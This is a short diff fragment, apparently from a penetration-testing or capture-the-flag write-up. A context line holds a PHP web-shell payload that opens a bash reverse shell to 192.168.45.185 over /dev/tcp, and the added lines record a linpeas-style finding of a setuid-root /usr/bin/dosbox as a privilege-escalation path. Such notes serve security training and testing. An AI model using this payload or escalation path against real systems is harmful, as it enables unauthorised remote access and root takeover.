@@ -350,6 +350,8 @@ payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
                       ╚════════════════════════════════════╝                                                                                                
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
+-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
+
 ```
 
 ### Cockpit
